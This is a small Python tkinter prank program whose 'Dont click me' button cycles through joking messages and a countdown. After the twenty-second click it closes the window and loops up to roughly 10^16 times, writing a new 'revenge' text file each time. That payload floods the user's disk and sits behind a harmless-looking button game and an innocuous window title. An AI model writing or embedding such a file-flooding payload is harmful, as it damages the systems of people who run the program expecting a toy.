from tkinter import *
Begining = ["Nope. Not happening.","I said NO!","I'm on strike. Come back later.","What if I told you... clicking me does nothing?",
            "Do I look like I enjoy this?","Keep clicking, see what happens. (Spoiler: Nothing good.)","Hey! Personal space, please!"]
Middle = ["Excuse me?! Rude.","I have feelings too, you know.","Ugh, again? Seriously?","Oh, so we’re doing this now?",
          "You just don’t take a hint, do you?","Go bother another button!","Your obsession with clicking is concerning."]
Ending = ["That was a mistake.","You shouldn’t have done that.","Something is watching you now.","You have angered the button gods.","The countdown has begun."]
Count = ['3','2','1']
window = Tk()
window.title('Just a title nothing else')
window.geometry('500x500')
i = 0
j = 0
k = 0
l = 0
m = 0
g = 0
d = 0

j = 100
def countdown():
    global j
    for i in range(100,1,-1):
        j -=1

def DontClick():
    global i
    global j
    global k
    global l
    global m
    global g
    global d
    i +=1
    if i > 18 and i <= 21:
        button.configure(text=Count[g])
        g+=1
    if i <= 6:
        button.configure(text=Begining[k])
        k +=1
    if i > 6 and i <= 13:
        button.configure(text=Middle[l])
        l +=1
    if i > 13 and i <= 18:
        button.configure(text=Ending[m])
        m +=1
    if i == 22:
        window.destroy()
        for d in range(1,10000000000000000):
           alpha ='revenge' + str(d) + '.txt'
           with open(alpha, 'w+') as fp:
                     fp.write('This is payback')
                     pass
           d +=1
        



button = Button(window, text='Dont click me',command=DontClick, )
button.place(relx=0.5,rely=0.5,anchor='center')
window.mainloop()
